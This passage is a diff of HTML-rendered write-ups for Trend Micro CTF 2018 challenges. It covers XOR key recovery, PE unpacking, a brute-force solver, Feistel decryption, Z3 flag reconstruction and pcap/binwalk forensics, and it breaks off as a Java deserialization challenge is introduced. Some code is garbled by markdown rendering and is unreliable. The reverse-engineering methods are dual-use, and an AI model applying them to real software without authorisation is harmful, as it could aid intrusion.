+ <span class="hljs-keyword">while</span> id == <span class="hljs-number">0</span> <span class="hljs-literal">or</span> n == <span class="hljs-number">0</span> <span class="hljs-literal">and</span> n &lt; <span class="hljs-number">256</span>:
+        id = os.urandom(<span class="hljs-number">1</span>)
+        n = <span class="hljs-built_in">hex</span>(ord(id) + bs)
+
+    id = id.encode(<span class="hljs-string">'hex'</span>)
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> passw:
+        passw = <span class="hljs-string">''</span>.join(<span class="hljs-built_in">chr</span>(ord(c) ^ <span class="hljs-built_in">int</span>(n, <span class="hljs-number">16</span>)))
+
+    key = <span class="hljs-string">''</span>.join((<span class="hljs-built_in">chr</span>(ord(x) ^ <span class="hljs-built_in">int</span>(n, <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> key))
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> rkey:
+        rkey = <span class="hljs-string">''</span>.join(<span class="hljs-built_in">chr</span>(ord(c) ^ <span class="hljs-built_in">int</span>(n, <span class="hljs-number">16</span>)))
+
+    iv = <span class="hljs-string">''</span>.join((<span class="hljs-built_in">chr</span>(ord(y) ^ <span class="hljs-built_in">int</span>(n, <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> iv))
+    key = key.encode(<span class="hljs-string">'hex'</span>)
+    iv = iv.encode(<span class="hljs-string">'hex'</span>)</code></pre><ol start="5">
+<li>The original key = <code>&quot;ce66e0fe4c272316d680f66797c057e7&quot;.decode(&quot;hex&quot;)</code></li>
+<li>The original iv = <code>&quot;745def348b5106d157ad2f70281f7271&quot;.decode(&quot;hex&quot;)</code></li>
+<li>Now you know how to retrieve the flag <code>TMCTF{MJB1200}</code></li>
+</ol>
+<h3 id="300-1"><a class="header-link" href="#300-1"></a>300</h3>
+<p>The PE file has been <code>MEW</code> packed, we can using ollydbg to unpack it. And it also has anti debugger detection, but we can easily using static analysis to find the flag.</p>
+<h3 id="400"><a class="header-link" href="#400"></a>400</h3>
+<h4 id="part-2"><a class="header-link" href="#part-2"></a>part 2</h4>
+<p>Using state compression to boost the speed of searching.</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> GCC optimize (<span class="hljs-meta-string">"O3"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> GCC optimize (<span class="hljs-meta-string">"O3"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> f first</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> s second</span>
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
+<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; par;
+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> op[<span class="hljs-number">62</span>];
+<span class="hljs-keyword">int</span> cnt=<span class="hljs-number">0</span>;
+<span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> <span class="hljs-title">tohex</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span>{
+    <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">9</span>)<span class="hljs-keyword">return</span> x<span class="hljs-number">-10</span>+<span class="hljs-string">'a'</span>;
+    <span class="hljs-keyword">return</span> x+<span class="hljs-string">'0'</span>;
+}
+<span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];
+<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">chash</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> a = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">62</span>;i++){
+        a = ( tohex((op[i]&gt;&gt;<span class="hljs-number">4</span>&amp;<span class="hljs-number">0xF</span>)) + (a &gt;&gt; <span class="hljs-number">13</span> | a &lt;&lt; <span class="hljs-number">19</span>)) &amp; <span class="hljs-number">0xffffffff</span>ll;
+        a = ( tohex(op[i]&amp;<span class="hljs-number">0xF</span>) + (a &gt;&gt; <span class="hljs-number">13</span> | a &lt;&lt; <span class="hljs-number">19</span>)) &amp; <span class="hljs-number">0xffffffff</span>ll;
+    }
+    <span class="hljs-keyword">return</span> a;
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">F</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p,<span class="hljs-keyword">int</span> mask,<span class="hljs-keyword">bool</span> boat)</span></span>{
+    <span class="hljs-keyword">if</span>(p==<span class="hljs-number">62</span>&amp;&amp;mask==<span class="hljs-number">0xFF</span>){
+        cnt++;
+        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> hsh=chash();
+        <span class="hljs-keyword">if</span>(
+            hsh==<span class="hljs-number">0xE67FE7B8</span>||
+            hsh==<span class="hljs-number">0xE27FEBB8</span>||
+            hsh==<span class="hljs-number">0xE66FE7C8</span>||
+            hsh==<span class="hljs-number">0xE26FEBC8</span>||
+            hsh==<span class="hljs-number">0xF276F3DC</span>||
+            hsh==<span class="hljs-number">0xE27703DC</span>||
+            hsh==<span class="hljs-number">0xF272F3E0</span>||
+            hsh==<span class="hljs-number">0xE27303E0</span>
+        ){
+            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">"%d %08x "</span>,cnt,hsh);
+            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">62</span>;i++)
+                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">"%02x"</span>,op[i]);
+            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">"\n"</span>);
+        }
+        <span class="hljs-comment">//puts("~~~");</span>
+        <span class="hljs-keyword">return</span>;
+    }
+    <span class="hljs-keyword">if</span>(p+<span class="hljs-number">4</span>&lt;=<span class="hljs-number">62</span>){
+        op[p]=<span class="hljs-number">0xd1</span>;
+        <span class="hljs-keyword">if</span>(boat==<span class="hljs-number">0</span>){
+            op[p+<span class="hljs-number">1</span>]=<span class="hljs-number">0x1</span>;
+            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> x=~mask&amp;<span class="hljs-number">0xFF</span>,y=x&amp;-x;y;x^=y,y=x&amp;-x){
+                op[p+<span class="hljs-number">3</span>]=y;
+                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> x2=(x^y)&amp;<span class="hljs-number">0xE0</span>,y2=x2&amp;-x2;y2;x2^=y2,y2=x2&amp;-x2){
+                    op[p+<span class="hljs-number">2</span>]=y2;
+                    <span class="hljs-keyword">if</span>(y2==<span class="hljs-number">0x40</span>&amp;&amp;y==<span class="hljs-number">0x10</span>)
+                        <span class="hljs-keyword">continue</span>;
+                    <span class="hljs-keyword">int</span> nmk=mask^y^y2;
+                    <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x20</span>||y2==<span class="hljs-number">0x20</span>)&amp;&amp;((~nmk&amp;<span class="hljs-number">0x42</span>)==<span class="hljs-number">0x42</span>||(~nmk&amp;<span class="hljs-number">0x41</span>)==<span class="hljs-number">0x41</span>))
+                        <span class="hljs-keyword">continue</span>;
+                    <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x40</span>||y2==<span class="hljs-number">0x40</span>)&amp;&amp;((~nmk&amp;<span class="hljs-number">0x28</span>)==<span class="hljs-number">0x28</span>||(~nmk&amp;<span class="hljs-number">0x24</span>)==<span class="hljs-number">0x24</span>))
+                        <span class="hljs-keyword">continue</span>;
+                    <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x80</span>||y2==<span class="hljs-number">0x80</span>)&amp;&amp;((~nmk&amp;<span class="hljs-number">0x10</span>)==<span class="hljs-number">0x10</span>&amp;&amp;(~nmk&amp;<span class="hljs-number">0xFF</span>)!=<span class="hljs-number">0x10</span>))
+                        <span class="hljs-keyword">continue</span>;
+                    F(p+<span class="hljs-number">4</span>,nmk,boat^<span class="hljs-number">1</span>);
+                }
+            }
+        }
+        <span class="hljs-keyword">else</span>{
+            op[p+<span class="hljs-number">1</span>]=<span class="hljs-number">0x0</span>;
+            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> x=mask,y=x&amp;-x;y;x^=y,y=x&amp;-x){
+                op[p+<span class="hljs-number">3</span>]=y;
+                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> x2=(x^y)&amp;<span class="hljs-number">0xE0</span>,y2=x2&amp;-x2;y2;x2^=y2,y2=x2&amp;-x2){
+                    op[p+<span class="hljs-number">2</span>]=y2;
+                    <span class="hljs-keyword">if</span>(y2==<span class="hljs-number">0x40</span>&amp;&amp;y==<span class="hljs-number">0x10</span>)
+                        <span class="hljs-keyword">continue</span>;
+                    <span class="hljs-keyword">int</span> nmk=mask^y^y2;
+                    <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x20</span>||y2==<span class="hljs-number">0x20</span>)&amp;&amp;((nmk&amp;<span class="hljs-number">0x42</span>)==<span class="hljs-number">0x42</span>||(nmk&amp;<span class="hljs-number">0x41</span>)==<span class="hljs-number">0x41</span>))
+                        <span class="hljs-keyword">continue</span>;
+                    <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x40</span>||y2==<span class="hljs-number">0x40</span>)&amp;&amp;((nmk&amp;<span class="hljs-number">0x28</span>)==<span class="hljs-number">0x28</span>||(nmk&amp;<span class="hljs-number">0x24</span>)==<span class="hljs-number">0x24</span>))
+                        <span class="hljs-keyword">continue</span>;
+                    <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x80</span>||y2==<span class="hljs-number">0x80</span>)&amp;&amp;((nmk&amp;<span class="hljs-number">0x10</span>)==<span class="hljs-number">0x10</span>&amp;&amp;(nmk&amp;<span class="hljs-number">0xFF</span>)!=<span class="hljs-number">0x10</span>))
+                        <span class="hljs-keyword">continue</span>;
+                    F(p+<span class="hljs-number">4</span>,nmk,boat^<span class="hljs-number">1</span>);
+                }
+            }
+        }
+    }
+    <span class="hljs-keyword">if</span>(p+<span class="hljs-number">3</span>&lt;=<span class="hljs-number">62</span>){
+        op[p]=<span class="hljs-number">0xd0</span>;
+        <span class="hljs-keyword">if</span>(boat==<span class="hljs-number">0</span>){
+            op[p+<span class="hljs-number">1</span>]=<span class="hljs-number">0x1</span>;
+            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> x=~mask&amp;<span class="hljs-number">0xE0</span>,y=x&amp;-x;y;x^=y,y=x&amp;-x){
+                op[p+<span class="hljs-number">2</span>]=y;
+                <span class="hljs-keyword">int</span> nmk=mask^y;
+                <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x20</span>)&amp;&amp;((~nmk&amp;<span class="hljs-number">0x42</span>)==<span class="hljs-number">0x42</span>||(~nmk&amp;<span class="hljs-number">0x41</span>)==<span class="hljs-number">0x41</span>))
+                    <span class="hljs-keyword">continue</span>;
+                <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x40</span>)&amp;&amp;((~nmk&amp;<span class="hljs-number">0x28</span>)==<span class="hljs-number">0x28</span>||(~nmk&amp;<span class="hljs-number">0x24</span>)==<span class="hljs-number">0x24</span>))
+                    <span class="hljs-keyword">continue</span>;
+                <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x80</span>)&amp;&amp;((~nmk&amp;<span class="hljs-number">0x10</span>)==<span class="hljs-number">0x10</span>&amp;&amp;(~nmk&amp;<span class="hljs-number">0xFF</span>)!=<span class="hljs-number">0x10</span>))
+                    <span class="hljs-keyword">continue</span>;
+                F(p+<span class="hljs-number">3</span>,nmk,boat^<span class="hljs-number">1</span>);
+            }
+        }
+        <span class="hljs-keyword">else</span>{
+            op[p+<span class="hljs-number">1</span>]=<span class="hljs-number">0x0</span>;
+            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> x=mask&amp;<span class="hljs-number">0xE0</span>,y=x&amp;-x;y;x^=y,y=x&amp;-x){
+                op[p+<span class="hljs-number">2</span>]=y;
+                <span class="hljs-keyword">int</span> nmk=mask^y;
+                <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x20</span>)&amp;&amp;((nmk&amp;<span class="hljs-number">0x42</span>)==<span class="hljs-number">0x42</span>||(nmk&amp;<span class="hljs-number">0x41</span>)==<span class="hljs-number">0x41</span>))
+                    <span class="hljs-keyword">continue</span>;
+                <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x40</span>)&amp;&amp;((nmk&amp;<span class="hljs-number">0x28</span>)==<span class="hljs-number">0x28</span>||(nmk&amp;<span class="hljs-number">0x24</span>)==<span class="hljs-number">0x24</span>))
+                    <span class="hljs-keyword">continue</span>;
+                <span class="hljs-keyword">if</span>((y==<span class="hljs-number">0x80</span>)&amp;&amp;((nmk&amp;<span class="hljs-number">0x10</span>)==<span class="hljs-number">0x10</span>&amp;&amp;(nmk&amp;<span class="hljs-number">0xFF</span>)!=<span class="hljs-number">0x10</span>))
+                    <span class="hljs-keyword">continue</span>;
+                F(p+<span class="hljs-number">3</span>,mask^y,boat^<span class="hljs-number">1</span>);
+            }
+        }
+    }
+    <span class="hljs-keyword">return</span>;
+}
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    F(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);
+}</code></pre><p>And you would get the output in about 15 seconds on Intel 8650U.</p>
+<pre class="hljs"><code><span class="hljs-symbol">45721 </span>e27303e0 d1018010d00080d1018001d1008010d1012002d00020d1014020d00040d1018010d00020d1014020d00040d1014004d1008010d1018008d00080d1018010
+<span class="hljs-symbol">45724 </span>f272f3e0 d1018010d00080d1018001d1008010d1012002d00020d1014020d00040d1018010d00020d1014020d00040d1014008d1008010d1018004d00080d1018010
+<span class="hljs-symbol">59555 </span>e27703dc d1018010d00080d1018002d1008010d1012001d00020d1014020d00040d1018010d00020d1014020d00040d1014004d1008010d1018008d00080d1018010
+<span class="hljs-symbol">59558 </span>f276f3dc d1018010d00080d1018002d1008010d1012001d00020d1014020d00040d1018010d00020d1014020d00040d1014008d1008010d1018004d00080d1018010
+<span class="hljs-symbol">72019 </span>e26febc8 d1018010d00080d1018004d1008010d1014008d00040d1014020d00020d1018010d00040d1014020d00020d1012001d1008010d1018002d00080d1018010
+<span class="hljs-symbol">72022 </span>e66fe7c8 d1018010d00080d1018004d1008010d1014008d00040d1014020d00020d1018010d00040d1014020d00020d1012002d1008010d1018001d00080d1018010
+<span class="hljs-symbol">85399 </span>e27febb8 d1018010d00080d1018008d1008010d1014004d00040d1014020d00020d1018010d00040d1014020d00020d1012001d1008010d1018002d00080d1018010
+<span class="hljs-symbol">85402 </span>e67fe7b8 d1018010d00080d1018008d1008010d1014004d00040d1014020d00020d1018010d00040d1014020d00020d1012002d1008010d1018001d00080d1018010</code></pre><p>Send the instructions into the problem program.
+And you would get the flag:<code>TMCTF{v1rtu4l_r1v3r5_n_fl4g5}</code>
+By the way, there are 1348396 solutions of this problem.</p>
+<h2 id="forensics-crypto1"><a class="header-link" href="#forensics-crypto1"></a>Forensics-Crypto1</h2>
+<h3 id="400-1"><a class="header-link" href="#400-1"></a>400</h3>
+<p>We are given a pair of plaintext and ciphertext, also, an encrypted secret text. In this challenge, Feistel cipher is used in encryption. The round function is choosen to be <code>xor</code>, while the number of rounds of encryption is unknown. Our goal is to decrypt the secret text.</p>
+<p>Let&#39;s first write down the results after every round of encryption. Let <code>L</code>, <code>R</code> be the first and last half of the plaintext, we simply ignore the difference of the keys and denote the xor sum of them as <code>K</code>. (But remember that they are not actually the same.) Note that the operation <code>+</code> means <code>xor</code>.</p>
+<pre class="hljs"><code><span class="hljs-keyword">Round</span> <span class="hljs-number">0</span>: L, R
+<span class="hljs-keyword">Round</span> <span class="hljs-number">1</span>: R, L+R+<span class="hljs-keyword">K</span>
+<span class="hljs-keyword">Round</span> <span class="hljs-number">2</span>: L+R+<span class="hljs-keyword">K</span>, L+<span class="hljs-keyword">K</span>
+<span class="hljs-keyword">Round</span> <span class="hljs-number">3</span>: L+<span class="hljs-keyword">K</span>, R+<span class="hljs-keyword">K</span>
+<span class="hljs-keyword">Round</span> <span class="hljs-number">4</span>: R+<span class="hljs-keyword">K</span>, L+R+<span class="hljs-keyword">K</span>
+... repeat</code></pre><p>We could find a regular pattern of the results, it repeats every three rounds. Though we do not know the actual number of rounds of encryption, but there are only three possiblities to try. Here is our script for decryption:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bin2text</span><span class="hljs-params">(s)</span>:</span>
+    l = [s[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s), <span class="hljs-number">8</span>)]
+    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([chr(int(c, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> l])
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">binxor</span><span class="hljs-params">(s, t)</span>:</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([str(int(s[i]) ^ int(t[i])) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s))])
+
+...
+
+pt0, pt1 = pt[:<span class="hljs-number">144</span>], pt[<span class="hljs-number">144</span>:]
+ct0, ct1 = ct[:<span class="hljs-number">144</span>], ct[<span class="hljs-number">144</span>:]
+st0, st1 = st[:<span class="hljs-number">144</span>], st[<span class="hljs-number">144</span>:]
+
+<span class="hljs-comment"># guess the result is R+K, L+R+K</span>
+k1 = binxor(pt0, ct1)
+k2 = binxor(binxor(ct0, ct1), pt1)
+
+m1 = binxor(st1, k1)
+m2 = binxor(binxor(st0, st1), k2)
+print(bin2text(m1+m2))</code></pre><p>FLAG: <code>TMCTF{Feistel-Cipher-Flag-TMCTF2018}</code></p>
+<h2 id="forensics-crypto2"><a class="header-link" href="#forensics-crypto2"></a>Forensics-Crypto2</h2>
+<h3 id="100-(sces60107)-1"><a class="header-link" href="#100-(sces60107)-1"></a>100 (sces60107)</h3>
+<p>I will finish these part of writeup in my free time QQ</p>
+<h3 id="200-(sces60107)"><a class="header-link" href="#200-(sces60107)"></a>200 (sces60107)</h3>
+<ol class="list">
+<li>Use PyInstaller Extractor v1.9</li>
+<li>Cannot use uncompyle2. But we can reconstruct the flag directly from the byte code</li>
+<li>xxd mausoleum and get this
+<img src="https://i.imgur.com/Us1VVbq.png" alt=""></li>
+<li>It&#39;s easy to find out the pieces of flag. And you can reconstruct the flag <code>TMCTF{the_s3cr3t_i$_unE@rth3d}</code></li>
+</ol>
+<h3 id="300-2"><a class="header-link" href="#300-2"></a>300</h3>
+<p>We can dump a x86 boot sector from <code>email.pdf</code>, that is a filesystem. when we mount the filesystem, we can see a small packet replay tool provided by trendmicro. We can find a packet replay binary at bin folder in the project. </p>
+<p>It has one more parameter <code>-g</code> than the original binary. At function <code>sub_C42690(&quot;34534534534534534534534erertert676575675675675&quot;, 10)</code> return value is <code>0xfbfa</code>, when we change hex to decimal, we got the flag <code>64506</code></p>
+<h2 id="reversing-other"><a class="header-link" href="#reversing-other"></a>Reversing-Other</h2>
+<h3 id="100,-200-(sces60107)"><a class="header-link" href="#100,-200-(sces60107)"></a>100, 200 (sces60107)</h3>
+<p>I will finish these part of writeup in my free time QQ</p>
+<h3 id="400-(sces60107)"><a class="header-link" href="#400-(sces60107)"></a>400 (sces60107)</h3>
+<ol class="list">
+<li>Use <code>dis.dis</code> then you can extract python code</li>
+<li>Use Z3 to reconstruct the flag
+<code>`</code>python=
+from z3 import *</li>
+</ol>
+<p>s=Solver()</p>
+<p>flag=[]</p>
+<p>for i in range(24):
+  flag.append(BitVec(&quot;flag_&quot;+str(i),32))
+  s.add(flag[i] &lt; 256)
+  s.add(flag[i] &gt; 0)</p>
+<p>summ=0</p>
+<p>for i in flag:
+  summ+=i
+s.add(summ%24 == 9)
+s.add(summ/24 == 104)
+inval=[]</p>
+<p>for i in flag:
+  inval.append(i^104)
+ROFL=list(reversed(inval))
+KYRYK = [0]<em>5
+QQRTQ = [0]</em>5
+KYRYJ = [0]<em>5
+QQRTW = [0]</em>5
+KYRYH = [0]<em>5
+QQRTE = [0]</em>5
+KYRYG = [0]<em>5
+QQRTR = [0]</em>5
+KYRYF = [0]<em>5
+QQRTY = [0]</em>5
+print len(inval)</p>
+<p>for i in range(5):
+  for j in range(4):
+    KYRYK[i] ^= inval[i+j]
+    QQRTQ[i] += inval[i+j]
+    KYRYJ[i] ^= inval[i<em>j]
+    QQRTW[i] += inval[i</em>j]
+    KYRYH[i] ^= inval[i<em>j+8]
+    QQRTE[i] += inval[i</em>j+8]
+    KYRYG[i] ^= ROFL[i<em>j+8]
+    QQRTR[i] += ROFL[i</em>j+8]
+    KYRYF[i] ^= ROFL[i+j]
+    QQRTY[i] += ROFL[i+j]
+  KYRYK[i] += 32
+  KYRYJ[i] += 32
+  KYRYH[i] += 32
+  KYRYG[i] += 32
+  KYRYF[i] += 32
+  QQRTE[i] += 8
+  QQRTY[i] += 1</p>
+<p>for i,j in zip(KYRYK,&#39;R) +6&#39;):
+  k=ord(j)
+  s.add(i == k)
+for i,j in zip(QQRTQ,&#39;l1:C(&#39;):
+  k=ord(j)
+  s.add(i == k)
+for i,j in zip(KYRYJ,&#39; RP%A&#39;):
+  k=ord(j)
+  s.add(i == k)
+for i,j in zip(QQRTW,[236,108,102,169,93]):
+  s.add(i == j)
+for i,j in zip(KYRYH,&#39; L30Z&#39;):
+  k=ord(j)
+  s.add(i == k)
+for i,j in zip(QQRTE,&#39; j36~&#39;):
+  k=ord(j)</p>
+<p>  #print i,j
+  s.add(i == k)
+for i,j in zip(KYRYG,&#39; M2S+&#39;):
+  k=ord(j)</p>
+<p>  #print i,j
+  s.add(i == k)
+for i,j in zip(QQRTR,&#39;4e\x9c{E&#39;):
+  k=ord(j)
+  s.add(i == k)
+for i,j in zip(KYRYF,&#39;6!2$D&#39;):
+  k=ord(j)
+  s.add(i == k)
+for i,j in zip(QQRTY,&#39;]PaSs&#39;):
+  k=ord(j)
+  s.add(i == k)
+print s.check()
+realflag = &quot;&quot;
+for i in flag:
+  realflag+=chr(s.model()[i].as_long())
+print realflag</p>
+<h1 id="tmctf{slytherinpastthereverser}"><a class="header-link" href="#tmctf{slytherinpastthereverser}"></a>TMCTF{SlytherinPastTheReverser}</h1>
+<pre class="hljs"><code>
+<span class="hljs-meta">## Misc</span>
+
+<span class="hljs-meta">### 100</span>
+```shell
+$ binwalk <span class="hljs-type">EATME</span>.pdf
+
+<span class="hljs-type">DECIMAL</span>       <span class="hljs-type">HEXADECIMAL</span>     <span class="hljs-type">DESCRIPTION</span>
+<span class="hljs-comment">--------------------------------------------------------------------------------</span>
+<span class="hljs-number">0</span>             <span class="hljs-number">0x0</span>             <span class="hljs-type">PDF</span> document, version: <span class="hljs-string">"1.7"</span>
+<span class="hljs-number">353</span>           <span class="hljs-number">0x161</span>           <span class="hljs-type">JPEG</span> image <span class="hljs-class"><span class="hljs-keyword">data</span>, <span class="hljs-type">JFIF</span> standard 1.01</span>
+<span class="hljs-number">383</span>           <span class="hljs-number">0x17F</span>           <span class="hljs-type">TIFF</span> image <span class="hljs-class"><span class="hljs-keyword">data</span>, big-endian, offset of first image directory: 8</span>
+<span class="hljs-number">749016</span>        <span class="hljs-number">0xB6DD8</span>         <span class="hljs-type">Zip</span> archive <span class="hljs-class"><span class="hljs-keyword">data</span>, at least v2.0 to extract, compressed size: 41, uncompressed size: 200, name: flag.txt</span>
+<span class="hljs-number">749123</span>        <span class="hljs-number">0xB6E43</span>         <span class="hljs-type">Zip</span> archive <span class="hljs-class"><span class="hljs-keyword">data</span>, at least v2.0 to extract, compressed size: 4168158, uncompressed size: -1, name: galf.txt</span>
+<span class="hljs-number">4969997</span>       <span class="hljs-number">0x4BD60D</span>        <span class="hljs-type">End</span> <span class="hljs-keyword">of</span> <span class="hljs-type">Zip</span> archive, footer length: <span class="hljs-number">31</span>, comment: <span class="hljs-string">"Boooooom!"</span>
+<span class="hljs-number">4970099</span>       <span class="hljs-number">0x4BD673</span>        <span class="hljs-type">Zlib</span> compressed <span class="hljs-class"><span class="hljs-keyword">data</span>, default compression</span>
+<span class="hljs-number">4971214</span>       <span class="hljs-number">0x4BDACE</span>        <span class="hljs-type">Zlib</span> compressed <span class="hljs-class"><span class="hljs-keyword">data</span>, default compression</span>
+<span class="hljs-number">4971660</span>       <span class="hljs-number">0x4BDC8C</span>        <span class="hljs-type">Zlib</span> compressed <span class="hljs-class"><span class="hljs-keyword">data</span>, default compression</span></code></pre><p>There are files <code>flag.txt</code> and <code>glaf.txt</code>. Try:</p>
+<pre class="hljs"><code>$ binwalk -Me EATME.pdf
+<span class="hljs-section">DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------</span>
+0             0x0             PDF document, version: "1.7"
+353           0x161           JPEG image data, JFIF standard 1.01
+383           0x17F           TIFF image data, big-endian, offset of first image directory: 8
+^C</code></pre><p>Flag is in <code>flag.txt</code>. Be sure to press <code>^C</code>, otherwise, the file <code>galf.txt</code> with size <code>-1</code> will be extracted...
+FLAG: <code>TMCTF{QWxpY2UgaW4gV29uZGVybGFuZA==}</code></p>
+<h3 id="200-1"><a class="header-link" href="#200-1"></a>200</h3>
+<p>We are given a broken python script and a pcap file. The pcap file contains numerous ICMP ping packets, and it&#39;s obvious that there is payload hiding in ICMP tunnel. Let&#39;s extract them:</p>
+<pre class="hljs"><code>$ strings traffic.pcap -n16 | grep , | grep '^[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9,\.</span>]*'  -o
+4.242410,2.970880
+4.242410,2.970880
+7.021890,1.989350
+...</code></pre><p>Moreover, the broken python script implements DBSCAN algorithm. It&#39;s not very difficult to recover the script with the <a href="http://scikit-learn.org/stable/auto_examples/cluster/plot_dbscan.html">source</a> available. Also we adjust the DBSCAN parameters <code>eps</code> and <code>min_sample</code>. In fact several pairs of <code>eps</code> and <code>min_sample</code> can produce the desired result.</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
+<span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns; sns.set()  <span class="hljs-comment"># for plot styling</span>
+<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
+<span class="hljs-keyword">from</span> sklearn.datasets.samples_generator <span class="hljs-keyword">import</span> make_blobs
+<span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> genfromtxt
+<span class="hljs-keyword">from</span> sklearn.cluster <span class="hljs-keyword">import</span> DBSCAN
+
+<span class="hljs-comment">#humm, encontre este codigo en un servidor remoto</span>
+<span class="hljs-comment">#estaba junto con el "traffic.pcap"</span>
+<span class="hljs-comment"># que podria ser?, like some sample code </span>
+
+X = np.genfromtxt(<span class="hljs-string">'test_2.txt'</span>, delimiter=<span class="hljs-string">','</span>)
+print(X)
+db = DBSCAN(eps=<span class="hljs-number">0.3</span>, min_samples=<span class="hljs-number">10</span>).fit(X)
+labels = db.labels_
+n_clusters_ = len(set(labels)) - (<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> <span class="hljs-number">-1</span> <span class="hljs-keyword">in</span> labels <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>)
+core_samples_mask = np.zeros_like(db.labels_, dtype=bool)
+core_samples_mask[db.core_sample_indices_] = <span class="hljs-keyword">True</span>
+unique_labels = set(labels)
+colors = [plt.cm.Spectral(each)
+          <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> np.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, len(unique_labels))]
+<span class="hljs-keyword">for</span> k, col <span class="hljs-keyword">in</span> zip(unique_labels, colors):   
+    class_member_mask = (labels == k)
+    xy = X[class_member_mask &amp; core_samples_mask]
+    plt.plot(xy[:, <span class="hljs-number">0</span>], xy[:, <span class="hljs-number">1</span>], <span class="hljs-string">'o'</span>, markerfacecolor=tuple(col),
+             markeredgecolor=<span class="hljs-string">'k'</span>, markersize=<span class="hljs-number">14</span>)
+
+
+
+<span class="hljs-comment">#<span class="hljs-doctag">NOTE:</span> what you see in the sky put it format TMCTF{replace_here}</span>
+<span class="hljs-comment">#where "replace_here" is what you see</span>
+plt.title(<span class="hljs-string">'aaaaaaaa: %d'</span> % n_clusters_)
+plt.show()</code></pre><p class="img-container"><img src="https://i.imgur.com/8kxeOoM.png" alt=""></p>
+<p>With @sces60107&#39;s sharp eyes, we quicklly realize that this is the mirror or <code>FLAG:1</code>. And the rest of the work is to guess the flag. Try each combination of <code>One, 1, oNE, ONE, FLAG:1, flag:one, 1:flag, flag:1 ....</code></p>
+<p>The flag comes out to be <code>TMCTF{flag:1}</code>.</p>
+<h3 id="300-3"><a class="header-link" href="#300-3"></a>300</h3>
+<p>The challenge is about java unsafe deserialization. The file includes <code>commons-collections-3.1.jar</code> and a web server, which deserializes the user&#39;s input:</p>
